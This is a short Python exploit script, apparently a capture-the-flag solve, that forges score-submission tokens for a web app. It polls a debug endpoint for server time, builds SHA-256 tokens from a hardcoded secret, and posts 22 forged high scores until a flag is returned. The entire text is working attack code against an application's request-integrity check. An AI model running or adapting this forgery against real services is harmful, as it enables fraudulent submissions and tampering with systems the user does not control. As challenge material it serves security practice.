import hashlib
import time
import requests
import random

TARGET = "https://9f379485-8cfc-41d6-9159-9abbf15f0297.espark.tn/"
USER_ID = 1
SECRET = "x9k#mPv!q2"

def get_server_time():
    return int(requests.get(f"{TARGET}/api/debug").json()["time"])

def generate_token(uid, score, ts):
    data = f"{uid}{score}{ts}{SECRET}"
    return hashlib.sha256(data.encode()).hexdigest()[:16]

def wait_for_fresh_second():
    t = get_server_time()
    # Wait until server_time changes to a NEW second
    while get_server_time() == t:
        time.sleep(0.005)
    return get_server_time()

def submit_once(score):
    # Sync to a new second so server delay does not break the token
    ts = wait_for_fresh_second()

    token = generate_token(USER_ID, score, ts)
    payload = {
        "user_id": USER_ID,
        "score": score,
        "token": token
    }
    return requests.post(f"{TARGET}/api/submit_score", json=payload).json()

print("[*] Submitting 22 clean scores...")

valid = 0
for i in range(22):
    score = 900 + i
    result = submit_once(score)
    print(f"[#] {i+1}: {result}")
    if result.get("success"):
        valid += 1
    if result.get("flag"):
        print("FLAG:", result["flag"])
        break

print("Valid submissions:", valid)
